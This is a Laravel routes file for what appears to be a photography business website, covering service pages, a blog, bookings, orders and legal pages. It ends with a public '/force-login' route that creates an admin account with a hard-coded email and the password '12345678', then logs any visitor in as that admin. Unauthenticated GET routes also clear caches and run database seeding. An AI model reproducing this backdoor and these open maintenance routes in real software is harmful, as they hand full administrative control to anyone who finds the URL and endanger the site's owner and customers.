<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

Route::get('/', [App\Http\Controllers\PageController::class, 'home']);

Route::get('/weddings', [App\Http\Controllers\PageController::class, 'weddings']);

Route::get('/proms', [App\Http\Controllers\PageController::class, 'proms']);

Route::get('/baptism', [App\Http\Controllers\PageController::class, 'baptism']);

Route::get('/commercial', [App\Http\Controllers\PageController::class, 'commercial']);
Route::get('/graduation', [App\Http\Controllers\PageController::class, 'graduation']);

Route::get('/family', [App\Http\Controllers\PageController::class, 'family']);
Route::get('/portrait', [App\Http\Controllers\PageController::class, 'portrait']);
Route::get('/automotive', [App\Http\Controllers\PageController::class, 'automotive']);
Route::get('/architectural', [App\Http\Controllers\PageController::class, 'architectural']);
Route::get('/events', [App\Http\Controllers\PageController::class, 'events']);

Route::get('/blog', [App\Http\Controllers\BlogController::class, 'index'])->name('blog.index');
Route::get('/blog/category/{slug}', [App\Http\Controllers\BlogController::class, 'category'])->name('blog.category');
Route::get('/blog/{slug}', [App\Http\Controllers\BlogController::class, 'show'])->name('blog.show');

Route::get('/sitemap.xml', [App\Http\Controllers\SitemapController::class, 'index']);

Route::get('/privacy', fn () => app(App\Http\Controllers\LegalPageController::class)->show('privacy'))->name('legal.privacy');
Route::get('/terms', fn () => app(App\Http\Controllers\LegalPageController::class)->show('terms'))->name('legal.terms');
Route::get('/cookies', fn () => app(App\Http\Controllers\LegalPageController::class)->show('cookies'))->name('legal.cookies');

Route::get('/clear-cache', function () {
    Artisan::call('cache:clear');
    Artisan::call('view:clear');
    Artisan::call('route:clear');
    Artisan::call('config:clear');
    Artisan::call('filament:cache-components');
    return redirect('/')->with('success', 'Cache cleared!');
});

Route::get('/seed-all', [App\Http\Controllers\SeedController::class, 'run']);

Route::post('/submit-order', [App\Http\Controllers\OrderController::class, 'submitOrder']);
Route::post('/submit-contact', [App\Http\Controllers\OrderController::class, 'submitContact']);
Route::post('/api/validate-promo-code', [App\Http\Controllers\OrderController::class, 'validatePromoCode'])->name('promo.validate');

Route::get('/booking', [App\Http\Controllers\BookingController::class, 'showCalendar']);
Route::post('/submit-booking', [App\Http\Controllers\BookingController::class, 'submitBooking']);
Route::get('/api/booking-availability', [App\Http\Controllers\BookingController::class, 'getAvailability']);
Route::get('/api/booking-hours', [App\Http\Controllers\BookingController::class, 'getAvailableHours']);

// Registration Routes
// Route::get('/register', [App\Http\Controllers\Auth\RegisterController::class, 'show'])->name('register');
// Route::post('/register', [App\Http\Controllers\Auth\RegisterController::class, 'register']);

use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

Route::get('/force-login', function () {
    $user = User::updateOrCreate(
        ['email' => 'presiangrigorovdev@gmail.com'],
        [
            'name' => 'Presian',
            'password' => Hash::make('12345678'),
            'is_admin' => true,
        ]
    );
    
    Auth::login($user);
    return redirect('/admin');
});
